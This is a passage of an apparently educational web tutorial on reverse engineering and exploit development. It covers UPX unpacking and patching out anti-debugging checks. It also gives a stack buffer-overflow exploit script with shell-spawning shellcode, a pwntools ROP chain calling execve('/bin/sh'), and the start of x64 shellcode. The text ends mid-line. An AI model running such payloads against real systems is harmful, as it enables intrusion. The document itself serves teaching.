plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 4. Dump process memory to file</span><br></span></code></pre></div></div>
<p><strong>Manual unpacking process:</strong></p>
<ol>
<li class=""><strong>Load in debugger</strong> (x64dbg)</li>
<li class=""><strong>Find tail jump</strong> (last jump before OEP)<!-- -->
<ul>
<li class="">UPX typically has a <code>jmp &amp;lt;OEP&amp;gt;</code> at end of unpacking stub</li>
</ul>
</li>
<li class=""><strong>Set breakpoint</strong> on tail jump</li>
<li class=""><strong>Run until breakpoint hit</strong></li>
<li class=""><strong>Step into jump</strong> (F7) → now at OEP</li>
<li class=""><strong>Dump process</strong> (Scylla plugin in x64dbg):<!-- -->
<ul>
<li class="">Plugins → Scylla → Dump → Select process → Dump</li>
</ul>
</li>
<li class=""><strong>Fix imports</strong> (Scylla):<!-- -->
<ul>
<li class="">IAT Autosearch → Get Imports → Fix Dump</li>
</ul>
</li>
</ol>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="anti-debugging-techniques">Anti-Debugging Techniques<a href="#anti-debugging-techniques" class="hash-link" aria-label="Direct link to Anti-Debugging Techniques" title="Direct link to Anti-Debugging Techniques" translate="no">​</a></h3>
<p>See <a href="#bypassing-anti-debugging" class="">Dynamic Analysis → Bypassing Anti-Debugging</a> for detailed techniques and bypasses.</p>
<p><strong>Common anti-debugging methods:</strong></p>
<ol>
<li class=""><strong>IsDebuggerPresent</strong> API call</li>
<li class=""><strong>PEB BeingDebugged</strong> flag check</li>
<li class=""><strong>RDTSC</strong> timing checks</li>
<li class=""><strong>Exception-based detection</strong> (debuggers handle exceptions differently)</li>
<li class=""><strong>Hardware breakpoint detection</strong> (check DR0-DR7 registers)</li>
<li class=""><strong>Software breakpoint detection</strong> (check for <code>0xCC</code> INT3 instructions)</li>
<li class=""><strong>Parent process check</strong> (debugged process has debugger as parent)</li>
</ol>
<p><strong>Patching anti-debugging:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># IDA Pro: Identify anti-debug check, patch to NOP</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Example: Patch &quot;call IsDebuggerPresent&quot; to &quot;xor eax, eax&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Before:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">call IsDebuggerPresent  </span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> E8 XX XX XX XX</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">test</span><span class="token plain"> eax, eax           </span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">85</span><span class="token plain"> C0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">jnz debugger_detected   </span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">75</span><span class="token plain"> XX</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># After (patch):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">xor eax, eax            </span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">33</span><span class="token plain"> C0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nop                     </span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">90</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nop                     </span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">90</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nop                     </span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">90</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">test</span><span class="token plain"> eax, eax           </span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">85</span><span class="token plain"> C0 </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">unchanged, EAX always </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">jnz debugger_detected   </span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">75</span><span class="token plain"> XX </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">never jumps</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># IDA Pro: Edit → Patch program → Assemble</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Or: Hex edit: Replace &quot;E8 XX XX XX XX&quot; with &quot;33 C0 90 90 90&quot;</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="code-virtualization">Code Virtualization<a href="#code-virtualization" class="hash-link" aria-label="Direct link to Code Virtualization" title="Direct link to Code Virtualization" translate="no">​</a></h3>
<p><strong>Code virtualization</strong> converts native code to custom VM bytecode.</p>
<p><strong>Example (VMProtect):</strong></p>
<p><strong>Before (native x86):</strong></p>
<div class="language-nasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-nasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mov eax, 0x42</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">add eax, ebx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ret</span><br></span></code></pre></div></div>
<p><strong>After (VMProtect - custom bytecode):</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">VM_PUSH 0x42        ; Push 0x42 to VM stack</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">VM_PUSH_REG EBX     ; Push EBX to VM stack</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">VM_ADD              ; Pop two values, add, push result</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">VM_POP_REG EAX      ; Pop result to EAX</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">VM_RET              ; Return</span><br></span></code></pre></div></div>
<p><strong>Defeating virtualization:</strong></p>
<ul>
<li class=""><strong>Time-consuming:</strong> Reverse the VM interpreter (understand bytecode handlers)</li>
<li class=""><strong>Automated tools:</strong> VMAttack, NoVmp (experimental, limited success)</li>
<li class=""><strong>Alternative:</strong> Dynamic analysis (bypass VM, focus on decrypted API calls)</li>
</ul>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="exploit-development">Exploit Development<a href="#exploit-development" class="hash-link" aria-label="Direct link to Exploit Development" title="Direct link to Exploit Development" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="buffer-overflows">Buffer Overflows<a href="#buffer-overflows" class="hash-link" aria-label="Direct link to Buffer Overflows" title="Direct link to Buffer Overflows" translate="no">​</a></h3>
<p><strong>Stack-based buffer overflow:</strong></p>
<p><strong>Vulnerable code:</strong></p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;stdio.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;string.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">vulnerable_function</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">input</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> buffer</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">64</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">strcpy</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">buffer</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> input</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">// No bounds checking!</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Buffer: %s\n&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> buffer</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> argc</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token plain">argv</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">argc </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token function" style="color:#d73a49">vulnerable_function</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">argv</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p><strong>Exploitation:</strong></p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Generate payload to overwrite return address</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> struct</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Step 1: Find offset to return address</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Use pattern_create (pwntools or msf-pattern_create)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># python3 -c &#x27;from pwn import *; print(cyclic(200))&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Step 2: Run program with pattern, crash at EIP=0x61616171</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Use pattern_offset to find offset:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># python3 -c &#x27;from pwn import *; print(cyclic_find(0x61616171))&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Offset: 76 bytes</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Step 3: Craft payload</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">offset </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">76</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">return_address </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> struct</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">pack</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;&lt;I&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x08048484</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic"># Address of shellcode or gadget</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nop_sled </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\x90&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">16</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic"># NOP sled</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">shellcode </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68...&quot;</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic"># Shellcode (spawn shell)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;A&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> offset </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> return_address </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> nop_sled </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> shellcode</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Run:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># ./vulnerable &quot;$(python3 exploit.py)&quot;</span><br></span></code></pre></div></div>
<p><strong>Stack layout during overflow:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">High memory</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-----------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[Return address]   &lt;-- Overwrite with shellcode address</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[Saved EBP]        &lt;-- Overwritten</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[buffer[64]]       &lt;-- Buffer overflow starts here</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Low memory</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="return-oriented-programming-rop">Return-Oriented Programming (ROP)<a href="#return-oriented-programming-rop" class="hash-link" aria-label="Direct link to Return-Oriented Programming (ROP)" title="Direct link to Return-Oriented Programming (ROP)" translate="no">​</a></h3>
<p><strong>ROP</strong> chains together &quot;gadgets&quot; (short instruction sequences ending in <code>ret</code>) to execute code without injecting shellcode.</p>
<p><strong>Why ROP?</strong></p>
<ul>
<li class=""><strong>DEP/NX:</strong> Data Execution Prevention prevents executing code on stack/heap</li>
<li class=""><strong>ASLR:</strong> Address Space Layout Randomization makes hardcoded addresses unreliable</li>
<li class=""><strong>ROP bypasses DEP:</strong> Uses existing code in binary/libraries (already executable)</li>
</ul>
<p><strong>Finding ROP gadgets:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># ROPgadget (Python tool):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ROPgadget </span><span class="token parameter variable" style="color:#36acaa">--binary</span><span class="token plain"> vulnerable </span><span class="token parameter variable" style="color:#36acaa">--ropchain</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Or use ropper:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ropper </span><span class="token parameter variable" style="color:#36acaa">--file</span><span class="token plain"> vulnerable </span><span class="token parameter variable" style="color:#36acaa">--search</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;pop rdi&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Example gadgets:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x004005a3: pop rdi</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x004005a1: pop rsi</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> pop r15</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00400490: pop rax</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x00400610: syscall</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> ret</span><br></span></code></pre></div></div>
<p><strong>ROP chain example (call execve(&quot;/bin/sh&quot;)):</strong></p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> pwn </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Gadgets:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pop_rdi </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x004005a3</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic"># pop rdi; ret</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pop_rsi_r15 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x004005a1</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic"># pop rsi; pop r15; ret</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pop_rax </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00400490</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic"># pop rax; ret</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">syscall </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00400610</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic"># syscall; ret</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Data:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bin_sh </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00601050</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic"># Address of &quot;/bin/sh&quot; string in binary</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># ROP chain to call execve(&quot;/bin/sh&quot;, NULL, NULL):</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># execve(rdi=&quot;/bin/sh&quot;, rsi=NULL, rdx=NULL) -&gt; syscall 59</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rop_chain </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">pop_rdi</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">bin_sh</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">       </span><span class="token comment" style="color:#999988;font-style:italic"># rdi = &quot;/bin/sh&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rop_chain </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">pop_rsi_r15</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic"># rsi = NULL, r15 = 0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rop_chain </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">pop_rax</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">59</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">          </span><span class="token comment" style="color:#999988;font-style:italic"># rax = 59 (execve syscall)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rop_chain </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">syscall</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">                    </span><span class="token comment" style="color:#999988;font-style:italic"># syscall</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Full payload:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;A&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">76</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> rop_chain</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Send to vulnerable program</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="shellcode-development">Shellcode Development<a href="#shellcode-development" class="hash-link" aria-label="Direct link to Shellcode Development" title="Direct link to Shellcode Development" translate="no">​</a></h3>
<p><strong>Shellcode</strong> is position-independent code (typically for spawning a shell).</p>
<p><strong>Linux x64 shellcode (execve(&quot;/bin/sh&quot;)):</strong></p>
<div class="language-nasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-nasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">; execve(&quot;/bin/sh&quot;, NULL, NULL)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; syscall number: 59 (in RAX)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">section .text</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">global _start</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">_start:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    xor rax, rax        ; RAX = 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    push rax            ; NULL terminator</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov rdi, 0x68732f6e69622f  ; 